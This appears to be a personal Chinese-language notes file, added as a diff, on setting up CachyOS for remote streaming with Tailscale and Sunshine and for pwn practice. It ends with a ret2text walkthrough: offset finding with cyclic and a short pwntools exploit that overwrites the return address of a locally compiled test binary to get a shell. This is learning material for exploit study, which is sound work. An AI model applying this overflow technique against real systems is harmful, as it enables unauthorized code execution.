@@ -1,0 +1,84 @@
+========================================================================
+CachyOS 远程串流与 Pwn 环境配置/实战标准工作流总结
+日期：2026年10月23日
+系统：CachyOS (Hyprland / Wayland)
+========================================================================
+
+一、远程串流环境搭建（针对护网/异地访问）
+
+1. 代理与网络配置：
+   - 为 pacman 配置代理：sudo https_proxy="http://127.0.0.1:7890" pacman -S [包名]
+   - 安装并启动 Tailscale：sudo pacman -S tailscale && sudo systemctl enable --now tailscaled
+   - 认证上线：sudo tailscale up
+   - 验证直连：tailscale ping [对端设备名]
+2. 串流服务（Sunshine + Moonlight）：
+   - 安装依赖与编码器：sudo pacman -S sunshine cuda libva-mesa-driver libva-utils
+   - 配置 Sunshine (~/.config/sunshine/sunshine.conf)：
+     - encoder = nvenc（因 GTX 960 无 AV1 编码，Sunshine 会自动降级到支持的 H.264）
+     - capture = wlr（Hyprland 必须使用 wlr 捕获）
+     - output_name = HEADLESS-1（锁定虚拟屏幕）
+   - 创建虚拟屏幕：hyprctl output create headless HEADLESS-1
+   - 启动服务：sunshine > ~/.local/share/sunshine.log 2>&1 &
+   - 客户端（Moonlight）通过 Tailscale IP (100.x.x.x) 配对并串流。
+
+========================================================================
+
+二、Pwn 与逆向环境配置
+
+1. 核心基础组件：
+   - sudo pacman -S gdb python-pwntools patchelf binutils ruby rubygems
+   - 安装 pwndbg (AUR)：yay -S pwndbg-git
+   - 配置 gdbinit：在 ~/.gdbinit 中加入 source /usr/share/pwndbg/gdbinit.py
+2. 辅助工具集：
+   - ROP 搜索：sudo pacman -S ropgadget ropper
+   - 沙箱与魔术地址：gem install one_gadget seccomp-tools
+   - 修复 Fish shell 找不到 Ruby 工具的问题：
+     sudo ln -sf ~/.local/share/gem/ruby/`ruby -e "puts RUBY_VERSION"`/bin/one_gadget /usr/local/bin/one_gadget
+     （seccomp-tools 同理）
+
+========================================================================
+
+三、Pwn 实战标准工作流（以 Ret2Text 为例）
+
+目标：利用栈溢出漏洞，覆盖程序返回地址 (RIP)，跳转到后门函数拿 Shell。
+
+1. 靶场准备与编译：
+   - 关闭 PIE 和 Canary，方便首次调试：
+     gcc test.c -o test -fno-stack-protector -no-pie
+   - 注意：现代 GCC 已废弃 gets()，需改用 read(0, buf, 100) 制造溢出。
+2. 静态分析查找目标：
+   - 查找后门地址：
+     readelf -s ./test | grep backdoor
+   - 记录该地址（例如 0x401146）。
+3. 动态调试计算偏移量（GDB + Pwndbg）：
+   - 启动调试：gdb ./test
+   - 生成测试字符串：cyclic 100
+   - 运行程序 (r)，粘贴字符串，回车使其崩溃。
+   - 在崩溃现场寻找被覆盖的 RBP/RSP/RIP 的值（如 0x6261616c6261616b）。
+   - 计算偏移：cyclic -l 0x6261616c6261616b
+   - 根据结果推算精确溢出偏移（例如 buf 32 + rbp 8 = 偏移 40）。
+4. 编写 EXP 脚本（pwntools）：
+   - 创建模板：pwn template ./test > exp.py
+   - 编写核心逻辑：
+
+     from pwn import *
+     io = process('./test')
+     # 填充垃圾数据 + 64位打包的目标地址
+     payload = b'A' * 40 + p64(0x401146)
+
+     io.sendline(payload)
+     io.interactive()
+
+   - 运行：python exp.py 成功获取本地 Shell。
+
+========================================================================
+
+四、核心避坑经验
+
+1. 代理透传：Linux 终端工具不读取桌面环境代理，sudo 下更需手动传递环境变量。
+2. 硬件兼容性：老显卡 (Maxwell) 跑硬编时，让软件自动降级；Hyprland 截图/串流必须用 wlr 协议。
+3. Python 3.14 兼容性：不要用 pip 强行安装旧版 Pwn 工具，Arch 官方源 (pacman) 是唯一真神。
+4. Fish Shell 环境变量：Gem 等包管理器安装的工具，需手动软链接到 /usr/local/bin。
+5. 版本滚动更新：CachyOS 编译 C 代码时需注意 C 标准更新（gets 禁用等）。
+
+========================================================================
